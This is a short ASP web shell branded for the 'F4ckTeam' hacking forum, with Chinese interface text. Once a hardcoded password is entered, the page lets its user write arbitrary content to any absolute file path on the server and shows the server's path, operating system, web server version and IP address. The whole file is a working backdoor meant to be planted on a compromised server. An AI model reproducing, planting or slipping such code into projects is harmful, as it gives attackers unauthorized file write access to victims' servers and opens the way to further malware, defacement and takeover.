<html>
<head>
<title>
法客论坛 - F4ckTeam
</title>
</head>
<body bgcolor="black">

<img src="http://i141.photobucket.com/albums/r61/22rockets/HeartBeat.gif">

<%
on error resume next
%>
<%
  if request("pass")="F4ck" then  '在这修改密码
  session("pw")="go"
  end if
%>
<%if session("pw")<>"go" then %>
<%="<center><br><form action='' method='post'>"%>
<%="<input name='pass' type='password' size='10'> <input "%><%="type='submit' value='芝麻开门'></center>"%>
<%else%>
<%
set fso=server.createobject("scripting.filesystemobject")
path=request("path")
if path<>"" then
data=request("da")
set da=fso.createtextfile(path,true)
da.write data
if err=0 then
%>
<table>
<tr>
<td>
<font color="red"><%="恭喜你已经成功将文件写入"+path %>
<%else%>
<%="写不进去哦，可能权限不够哦！"%></font>
<%
end if
err.clear
end if
da.close
%>
<%set da=nothing%>
<%set fos=nothing%>
<%="<form action='' method=post>"%>
<font color="red">写入文件绝对路径:<%="<input type=text name=path>"%></font>
<%="<br>"%>
<%="<br>"%>
<font color="#FFFF33">系统信息：</font><br>
<font color="#33FF00"><%="当前文件路径:"&server.mappath(request.servervariables("script_name"))%>
<%="<br>"%>
<%="操作系统为:"&Request.ServerVariables("OS")%>
<%="<br>"%>
<%="WEB服务器版本为:"&Request.ServerVariables("SERVER_SOFTWARE")%>
<%="<br>"%>
<%="服务器的IP为:"&Request.ServerVariables("LOCAL_ADDR")%></font>
<%="<br>"%><%="<br>"%>
<font color="#FFFF33">文件内容：</font><%="<br>"%>
<%=""%>
<%="<textarea name=da cols=50 rows=10 width=30></textarea>"%>
<%="<br>"%>
<%="<input type=submit value=确定写入>"%>
<%="</form>"%>
</td>
</tr>
</table>
<font color="#999999">法客论坛 - F4ckTeam<a href="http://team.f4ck.net"><font color="#CCCCCC">访问论坛</font>
<%end if%></body></html>